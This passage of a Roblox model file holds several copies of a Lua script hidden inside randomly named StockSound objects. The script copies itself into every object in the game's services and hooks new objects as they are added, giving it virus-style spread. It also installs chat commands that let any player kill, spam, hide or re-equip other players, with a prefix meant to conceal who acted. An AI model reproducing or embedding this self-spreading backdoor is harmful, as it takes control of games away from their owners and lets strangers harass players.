but if builderdude was ingame aswell, he would ALSO get the tools, so if you only want builderman to get them, you should say:

tools builderm

also, if you just say tools then a space, then EVERYONE will get the tools

the same goes for kill, god, ghost, and all the other commands that use playername
--]]

--everything below here is very complicated so it would be best if you DONT mess with it

wait(.4)
if game:service(&quot;Workspace&quot;):findFirstChild(&quot;IMDOINGITOKSODONTKILLMENOW&quot;) ~= nil then
wait(math.huge) --this should keep it busy
end
jkoer = Instance.new(script.Parent.className)
jkoer.Name = &quot;IMDOINGITOKSODONTKILLMENOW&quot;
jkoer.Parent = game:service(&quot;Workspace&quot;)
jkoer.archivable = false
--Check all systems needed are running well
game:service(&quot;Workspace&quot;)
game:service(&quot;Lighting&quot;)
game:service(&quot;StarterPack&quot;)
game:service(&quot;Teams&quot;)
game:service(&quot;SoundService&quot;)
game:service(&quot;Debris&quot;)
--
bin = script.Parent
g = {&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;} --abcdefg...
thetools = {}
function gettools(scanner)
if scanner.className == &quot;HopperBin&quot; or scanner.className == &quot;Tool&quot; then
if scanner.archivable == true then table.insert(thetools, scanner:Clone()) end
end
local sc = scanner:GetChildren()
for i = 1, #sc do
gettools(sc[i])
end
end
gettools(game:service(&quot;Workspace&quot;))
gettools(game:service(&quot;Lighting&quot;))
function uinf(k)
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end --a nice little bit of script that stops the game lagging
if k ~= bin and k ~= script and k ~= bin.Parent then
local me = script.Parent:Clone()
me.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
me.Name = (me.Name.. g[math.random(1, #g)])
end
local be = me[script.Name]
be.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
be.Name = (be.Name.. g[math.random(1, #g)])
end
me.Parent = k
local obs = k:GetChildren()
for i = 1, #obs do
infect(obs[i])
end
end
end
function infect(object)
local ONOES = 0
if object.className == &quot;Camera&quot; then return end
if object.className == &quot;Script&quot; then
if object.Source == script.Source then
ONOES = 1
end
end
local os = object:GetChildren()
for i = 1, #os do
local current = os[i]
if current.className == &quot;Script&quot; then
if current.Source == script.Source then
ONOES = 1
end
end
local oz = current:GetChildren()
for j = 1, #oz do
local cur = oz[j]
if cur.className == &quot;Script&quot; then
if cur.Source == script.Source then
ONOES = 1
end
end
end
end
if ONOES == 0 then
uinf(object)
else -- ONOSE!
local obs = object:GetChildren()
for i = 1, #obs do
if obs[i] ~= bin then
infect(obs[i])
end
end
end
end
function pultinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end
end
function multinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
end
function chat(msg, speaker) --oh yes these are commands...
if string.find(msg, &quot;/sc &quot;) == 1 then
msg = string.sub(msg, 5) --I LOVE being secretive, dont u?
end
if string.find(msg, &quot;shield &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
Instance.new(&quot;ForceField&quot;).Parent = plz[i].Character
end
end
end
if string.find(msg, &quot;kill &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
plz[i].Character:BreakJoints() --kill kill kill...
end
end
end
end
if string.find(msg, &quot;reset&quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character:BreakJoints()
end
end
if string.find(msg, &quot;name &quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character.Name = string.sub(msg, 6)
end
end
if string.find(msg, &quot;god &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 5)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.MaxHealth = math.huge
plz[i].Character.Humanoid.Health = math.huge
end
end
end
end
end
if string.find(msg, &quot;fast &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed * 1.35
end
end
end
end
end
if string.find(msg, &quot;slow &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed / 1.35
end
end
end
end
end
if string.find(msg, &quot;hide &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 1 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Decal&quot; then h[v]:Remove() end
if h[v].className == &quot;Part&quot; then h[v].Transparency = 1 end
end
end
end
end
end
end
if string.find(msg, &quot;show &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0 end
end
end
end
end
end
end
if string.find(msg, &quot;ghost &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.9 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.9 end
end
end
end
end
end
end
if string.find(msg, &quot;doom &quot;) == 1 then -- LOL this 1 is FUNNY
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if plz[i].Character.Head:findFirstChild(&quot;Mesh&quot;) ~= nil then
if plz[i].Character.Head.Mesh.className == &quot;SpecialMesh&quot; then
plz[i].Character.Head.Mesh.Scale = Vector3.new(17, 11, 17)
plz[i].Character.Head.Mesh.MeshType = &quot;Wedge&quot;
end
end
end
end
end
end
end
if string.find(msg, &quot;fade &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.5 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.5 end
end
end
end
end
end
end
if string.find(msg, &quot;join &quot;) == 1 then
local teams = game:service(&quot;Teams&quot;)
local tmz = teams:GetTeams()
for i = 1, #tmz do
if string.find(tmz[i].Name, string.sub(msg, 6)) == 1 then
speaker.Neutral = false
speaker.TeamColor = tmz[i].TeamColor
end
end
end
if string.find(msg, &quot;debug&quot;) == 1 then
local msgs = game.Workspace:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
local plz = game.Players:GetPlayers()
for j = 1, #plz do
local msgs = plz[j]:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
end
end
if string.find(msg, &quot;fog&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;FOGZORZ&quot;) == nil then
local newm = Instance.new(&quot;Message&quot;)
newm.Name = &quot;FOGZORZ&quot;
newm.Text = &quot; &quot;
newm.Parent = game.Workspace
newm:Clone().Parent = game.Workspace
end
end
if string.find(msg, &quot;say &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local said = string.sub(msg, 5)
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;shout &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Shouty&quot;) ~= nil then game.Workspace.Shouty:Remove() end
local said = string.sub(msg, 7)
local talk = Instance.new(&quot;Message&quot;)
talk.Name = &quot;Shouty&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;spam &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
for r = 1, 10 do
local er = Instance.new(&quot;Message&quot;)
er.Text = &quot; &quot;
er.Parent = plz[i]
end
end
end
end
if string.find(msg, &quot;bored&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Parent = game.Workspace
if math.random(1,2) == 1 then
talk.Text = &quot;OMG IM SO BORED TOO!&quot;
else
talk.Text = &quot;Go play a different game then.&quot;
end
end
if string.find(msg, &quot;goto &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if speaker.Character ~= nil then
if speaker.Character:findFirstChild(&quot;Head&quot;) ~= nil then
speaker.Character.Head.CFrame = CFrame.new(plz[i].Character.Head.Position + Vector3.new(0,3,0))
end
end
end
end
end
end
end
if string.find(msg, &quot;nofall &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Platform&quot;) == nil then
local fl = Instance.new(&quot;Part&quot;)
fl.Name = &quot;Platform&quot;
fl.formFactor = &quot;Plate&quot;
fl.Size = Vector3.new(6,.2,6)
fl.Anchored = true
fl.Transparency = 1
local sc = Instance.new(&quot;Script&quot;)
sc.Name = &quot;MoveToChar&quot;
pcall(function() sc.Source=[[ p = script.Parent c = p.Parent while true do t = c:findFirstChild(&quot;Head&quot;) if t == nil then p:Remove() else p.Position = Vector3.new(t.Position.x,0,t.Position.z) end wait() end ]] end)
if sc.Source ~= &quot;print(\&quot;Hello World\&quot;)&quot; then
sc.Parent = fl -- its pcalled just in case. Well I have no idea what crazy things the admins will do in a few days, like stop scripts editing sources, but then as if THATS ever going 2 happen... (it would be stupid cause most roblox scripters would leave)
fl.Parent = plz[i].Character
end
end
end
end
end
end
if string.find(msg, &quot;tools &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
local pack = plz[i]:findFirstChild(&quot;Backpack&quot;)
if pack ~= nil then
for o = 1, #thetools do
thetools[o]:Clone().Parent = pack
end
end
end
end
end
end
wait()
game.Players.PlayerAdded:connect(function(new) new.Chatted:connect(function(msg) chat(msg,new) end) end) -- I do love this connecting script...
wait()
multinfect(game:service(&quot;Workspace&quot;))
multinfect(game:service(&quot;Lighting&quot;))
multinfect(game:service(&quot;StarterPack&quot;))
multinfect(game:service(&quot;Teams&quot;))
multinfect(game:service(&quot;SoundService&quot;))
multinfect(game:service(&quot;Debris&quot;))
--now we can rest in peace...

death = type(RIP)
</string>
									<bool name="archivable">true</bool>
								</Properties>
							</Item>
						</Item>
					</Item>
					<Item class="StockSound" referent="RBX27">
						<Properties>
							<bool name="Looped">false</bool>
							<string name="Name">6grqzi</string>
							<int name="PlayCount">-1</int>
							<bool name="PlayOnRemove">false</bool>
							<Content name="SoundId"><null></null></Content>
							<float name="Volume">0.5</float>
							<bool name="archivable">true</bool>
						</Properties>
						<Item class="Script" referent="RBX28">
							<Properties>
								<bool name="Disabled">false</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">jk33w2ajk</string>
								<string name="Source">--             	 _                     |
-- unknowns 0.|_| Commands o
--

myname = &quot;builderman&quot; -- put your name here if you like!

--Hi, person who just looked inside a StockSound...
--Try these commands, they are great!

--[[COMMANDS:

say /sc BEFORE your command to make it so no-one kows its you who killed/shielded them

for example:

/sc shield builderman

reset  --this resets YOU
debug  --this removes all messages in the workspace and in players
fog  --this creates a few messages to look like fog, say debug to remove them

shield playername  --this shields the player named playername against explosions
kill playername  --this kills the player named playername
name newname  --this names YOUR CHARACTER the newname
god playername  --this sets the player playername unkillable by weapons that take damage (not explosions)
fast playername  --this speeds up the player named playername
slow playername --this slows the player named playername
hide playername  --this hides the player named playername
ghost playername  --this makes the player named playername ghostly
fade playername --this fades the player named playername a bit
show playername  --shows the player named playername
doom playername  --this makes there head a big triangle lol you can watch them running around stupidly
spam playername  --stops the player named playername seeing the chat properly
tools playername  --this gives the player the vip tools in the game
goto playername  --this moves your character to that players character
join teamname  --this joins the team named the teamname
say message  --creates a hint at the bottom of the screen saying your message
shout message  --creates a message on the screen saying your message

this is all case-sensitive

please note it is not needed to say the WHOLE name of the player, lets say just builderman was in the game:

tools bu would give him the VIP tools

but if builderdude was ingame aswell, he would ALSO get the tools, so if you only want builderman to get them, you should say:

tools builderm

also, if you just say tools then a space, then EVERYONE will get the tools

the same goes for kill, god, ghost, and all the other commands that use playername
--]]

--everything below here is very complicated so it would be best if you DONT mess with it

wait(.4)
if game:service(&quot;Workspace&quot;):findFirstChild(&quot;IMDOINGITOKSODONTKILLMENOW&quot;) ~= nil then
wait(math.huge) --this should keep it busy
end
jkoer = Instance.new(script.Parent.className)
jkoer.Name = &quot;IMDOINGITOKSODONTKILLMENOW&quot;
jkoer.Parent = game:service(&quot;Workspace&quot;)
jkoer.archivable = false
--Check all systems needed are running well
game:service(&quot;Workspace&quot;)
game:service(&quot;Lighting&quot;)
game:service(&quot;StarterPack&quot;)
game:service(&quot;Teams&quot;)
game:service(&quot;SoundService&quot;)
game:service(&quot;Debris&quot;)
--
bin = script.Parent
g = {&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;} --abcdefg...
thetools = {}
function gettools(scanner)
if scanner.className == &quot;HopperBin&quot; or scanner.className == &quot;Tool&quot; then
if scanner.archivable == true then table.insert(thetools, scanner:Clone()) end
end
local sc = scanner:GetChildren()
for i = 1, #sc do
gettools(sc[i])
end
end
gettools(game:service(&quot;Workspace&quot;))
gettools(game:service(&quot;Lighting&quot;))
function uinf(k)
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end --a nice little bit of script that stops the game lagging
if k ~= bin and k ~= script and k ~= bin.Parent then
local me = script.Parent:Clone()
me.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
me.Name = (me.Name.. g[math.random(1, #g)])
end
local be = me[script.Name]
be.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
be.Name = (be.Name.. g[math.random(1, #g)])
end
me.Parent = k
local obs = k:GetChildren()
for i = 1, #obs do
infect(obs[i])
end
end
end
function infect(object)
local ONOES = 0
if object.className == &quot;Camera&quot; then return end
if object.className == &quot;Script&quot; then
if object.Source == script.Source then
ONOES = 1
end
end
local os = object:GetChildren()
for i = 1, #os do
local current = os[i]
if current.className == &quot;Script&quot; then
if current.Source == script.Source then
ONOES = 1
end
end
local oz = current:GetChildren()
for j = 1, #oz do
local cur = oz[j]
if cur.className == &quot;Script&quot; then
if cur.Source == script.Source then
ONOES = 1
end
end
end
end
if ONOES == 0 then
uinf(object)
else -- ONOSE!
local obs = object:GetChildren()
for i = 1, #obs do
if obs[i] ~= bin then
infect(obs[i])
end
end
end
end
function pultinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end
end
function multinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
end
function chat(msg, speaker) --oh yes these are commands...
if string.find(msg, &quot;/sc &quot;) == 1 then
msg = string.sub(msg, 5) --I LOVE being secretive, dont u?
end
if string.find(msg, &quot;shield &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
Instance.new(&quot;ForceField&quot;).Parent = plz[i].Character
end
end
end
if string.find(msg, &quot;kill &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
plz[i].Character:BreakJoints() --kill kill kill...
end
end
end
end
if string.find(msg, &quot;reset&quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character:BreakJoints()
end
end
if string.find(msg, &quot;name &quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character.Name = string.sub(msg, 6)
end
end
if string.find(msg, &quot;god &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 5)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.MaxHealth = math.huge
plz[i].Character.Humanoid.Health = math.huge
end
end
end
end
end
if string.find(msg, &quot;fast &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed * 1.35
end
end
end
end
end
if string.find(msg, &quot;slow &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed / 1.35
end
end
end
end
end
if string.find(msg, &quot;hide &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 1 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Decal&quot; then h[v]:Remove() end
if h[v].className == &quot;Part&quot; then h[v].Transparency = 1 end
end
end
end
end
end
end
if string.find(msg, &quot;show &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0 end
end
end
end
end
end
end
if string.find(msg, &quot;ghost &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.9 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.9 end
end
end
end
end
end
end
if string.find(msg, &quot;doom &quot;) == 1 then -- LOL this 1 is FUNNY
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if plz[i].Character.Head:findFirstChild(&quot;Mesh&quot;) ~= nil then
if plz[i].Character.Head.Mesh.className == &quot;SpecialMesh&quot; then
plz[i].Character.Head.Mesh.Scale = Vector3.new(17, 11, 17)
plz[i].Character.Head.Mesh.MeshType = &quot;Wedge&quot;
end
end
end
end
end
end
end
if string.find(msg, &quot;fade &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.5 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.5 end
end
end
end
end
end
end
if string.find(msg, &quot;join &quot;) == 1 then
local teams = game:service(&quot;Teams&quot;)
local tmz = teams:GetTeams()
for i = 1, #tmz do
if string.find(tmz[i].Name, string.sub(msg, 6)) == 1 then
speaker.Neutral = false
speaker.TeamColor = tmz[i].TeamColor
end
end
end
if string.find(msg, &quot;debug&quot;) == 1 then
local msgs = game.Workspace:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
local plz = game.Players:GetPlayers()
for j = 1, #plz do
local msgs = plz[j]:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
end
end
if string.find(msg, &quot;fog&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;FOGZORZ&quot;) == nil then
local newm = Instance.new(&quot;Message&quot;)
newm.Name = &quot;FOGZORZ&quot;
newm.Text = &quot; &quot;
newm.Parent = game.Workspace
newm:Clone().Parent = game.Workspace
end
end
if string.find(msg, &quot;say &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local said = string.sub(msg, 5)
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;shout &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Shouty&quot;) ~= nil then game.Workspace.Shouty:Remove() end
local said = string.sub(msg, 7)
local talk = Instance.new(&quot;Message&quot;)
talk.Name = &quot;Shouty&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;spam &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
for r = 1, 10 do
local er = Instance.new(&quot;Message&quot;)
er.Text = &quot; &quot;
er.Parent = plz[i]
end
end
end
end
if string.find(msg, &quot;bored&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Parent = game.Workspace
if math.random(1,2) == 1 then
talk.Text = &quot;OMG IM SO BORED TOO!&quot;
else
talk.Text = &quot;Go play a different game then.&quot;
end
end
if string.find(msg, &quot;goto &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if speaker.Character ~= nil then
if speaker.Character:findFirstChild(&quot;Head&quot;) ~= nil then
speaker.Character.Head.CFrame = CFrame.new(plz[i].Character.Head.Position + Vector3.new(0,3,0))
end
end
end
end
end
end
end
if string.find(msg, &quot;nofall &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Platform&quot;) == nil then
local fl = Instance.new(&quot;Part&quot;)
fl.Name = &quot;Platform&quot;
fl.formFactor = &quot;Plate&quot;
fl.Size = Vector3.new(6,.2,6)
fl.Anchored = true
fl.Transparency = 1
local sc = Instance.new(&quot;Script&quot;)
sc.Name = &quot;MoveToChar&quot;
pcall(function() sc.Source=[[ p = script.Parent c = p.Parent while true do t = c:findFirstChild(&quot;Head&quot;) if t == nil then p:Remove() else p.Position = Vector3.new(t.Position.x,0,t.Position.z) end wait() end ]] end)
if sc.Source ~= &quot;print(\&quot;Hello World\&quot;)&quot; then
sc.Parent = fl -- its pcalled just in case. Well I have no idea what crazy things the admins will do in a few days, like stop scripts editing sources, but then as if THATS ever going 2 happen... (it would be stupid cause most roblox scripters would leave)
fl.Parent = plz[i].Character
end
end
end
end
end
end
if string.find(msg, &quot;tools &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
local pack = plz[i]:findFirstChild(&quot;Backpack&quot;)
if pack ~= nil then
for o = 1, #thetools do
thetools[o]:Clone().Parent = pack
end
end
end
end
end
end
wait()
game.Players.PlayerAdded:connect(function(new) new.Chatted:connect(function(msg) chat(msg,new) end) end) -- I do love this connecting script...
wait()
multinfect(game:service(&quot;Workspace&quot;))
multinfect(game:service(&quot;Lighting&quot;))
multinfect(game:service(&quot;StarterPack&quot;))
multinfect(game:service(&quot;Teams&quot;))
multinfect(game:service(&quot;SoundService&quot;))
multinfect(game:service(&quot;Debris&quot;))
--now we can rest in peace...

death = type(RIP)
</string>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
				</Item>
				<Item class="StockSound" referent="RBX29">
					<Properties>
						<bool name="Looped">false</bool>
						<string name="Name">fmgjh</string>
						<int name="PlayCount">-1</int>
						<bool name="PlayOnRemove">false</bool>
						<Content name="SoundId"><null></null></Content>
						<float name="Volume">0.5</float>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX30">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">mcs83</string>
							<string name="Source">--             	 _                     |
-- unknowns 0.|_| Commands o
--

myname = &quot;builderman&quot; -- put your name here if you like!

--Hi, person who just looked inside a StockSound...
--Try these commands, they are great!

--[[COMMANDS:

say /sc BEFORE your command to make it so no-one kows its you who killed/shielded them

for example:

/sc shield builderman

reset  --this resets YOU
debug  --this removes all messages in the workspace and in players
fog  --this creates a few messages to look like fog, say debug to remove them

shield playername  --this shields the player named playername against explosions
kill playername  --this kills the player named playername
name newname  --this names YOUR CHARACTER the newname
god playername  --this sets the player playername unkillable by weapons that take damage (not explosions)
fast playername  --this speeds up the player named playername
slow playername --this slows the player named playername
hide playername  --this hides the player named playername
ghost playername  --this makes the player named playername ghostly
fade playername --this fades the player named playername a bit
show playername  --shows the player named playername
doom playername  --this makes there head a big triangle lol you can watch them running around stupidly
spam playername  --stops the player named playername seeing the chat properly
tools playername  --this gives the player the vip tools in the game
goto playername  --this moves your character to that players character
join teamname  --this joins the team named the teamname
say message  --creates a hint at the bottom of the screen saying your message
shout message  --creates a message on the screen saying your message

this is all case-sensitive

please note it is not needed to say the WHOLE name of the player, lets say just builderman was in the game:

tools bu would give him the VIP tools

but if builderdude was ingame aswell, he would ALSO get the tools, so if you only want builderman to get them, you should say:

tools builderm

also, if you just say tools then a space, then EVERYONE will get the tools

the same goes for kill, god, ghost, and all the other commands that use playername
--]]

--everything below here is very complicated so it would be best if you DONT mess with it

wait(.4)
if game:service(&quot;Workspace&quot;):findFirstChild(&quot;IMDOINGITOKSODONTKILLMENOW&quot;) ~= nil then
wait(math.huge) --this should keep it busy
end
jkoer = Instance.new(script.Parent.className)
